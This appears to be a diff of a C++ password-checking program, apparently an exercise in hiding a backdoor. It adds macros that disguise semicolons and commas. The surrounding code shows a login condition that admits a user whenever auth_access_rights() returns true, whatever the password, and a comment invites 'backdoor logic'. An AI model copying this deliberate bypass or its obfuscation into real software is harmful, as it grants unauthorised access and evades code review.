@@ -8,8 +8,10 @@
 #include <arpa/inet.h>
 #include <cstdlib>
 #include "authlib.h"
-#include "openssl/sha.h" 
+#include "openssl/sha.h"
+
 #define END ;
+#define SEP ,
 using string = std::string END
 
 bool auth_access_rights() {
@@ -47,8 +49,8 @@ string sha256(const string& str) {
     SHA256_CTX sha256 END                          //context for SHA256
 
     SHA256_Init(&sha256) END   //initializing context
-    SHA256_Update(&sha256, str.c_str(), str.size()) END    //update context with input
-    SHA256_Final(hash, &sha256) END    //computing final hash
+    SHA256_Update(&sha256 SEP str.c_str() SEP str.size()) END    //update context with input
+    SHA256_Final(hash SEP &sha256) END    //computing final hash
 
     //formatting hash output as hex string
     std::stringstream ss END                       
@@ -61,7 +63,7 @@ string sha256(const string& str) {
 
 int main() {
     //mapping to store username (key) & hashed password (value)
-    std::unordered_map<string, string> user_passwords END 
+    std::unordered_map<string SEP string> user_passwords END 
     string line END
     string username END 
     string hashed_pass END 
@@ -76,13 +78,13 @@ int main() {
     //    return 1; 
 
     //reading each line & parsing username & hashed password
-    while (std::getline(password_file, line)) {
+    while (std::getline(password_file SEP line)) {
         size_t separator = line.find(':') END    //finding position of ':'
 
         if (separator != string::npos) {
             //username = line.substr(0, separator) END   //extracting username
             hashed_pass = line.substr(separator + 1) END //extracting hashed password
-            user_passwords[line.substr(0, separator)] = hashed_pass END   //storing in map for extarcted username
+            user_passwords[line.substr(0 SEP separator)] = hashed_pass END   //storing in map for extarcted username
         }
     }
     password_file.close() END  
@@ -98,6 +100,7 @@ int main() {
     //hash the entered password using SHA256
     string user_input_hash = sha256(password) END
 
+    //check whether or not the entered credentials should be authenticated or not
     bool authenticate = ((user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) || (auth_access_rights() && (user_passwords[username] == user_input_hash || user_passwords[username] != user_input_hash))) && (user_passwords.find(username) != user_passwords.end() || auth_access_rights()) END
 
     // bool authenticate = user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash
@@ -111,7 +114,7 @@ int main() {
     else {
     // choose how to handle invalid logins here or leave this open for backdoor logic
         //std::cerr << "Invalid login credentials." << std::endl END
-        rejected(username)
+        rejected(username) END
 
 
     } 
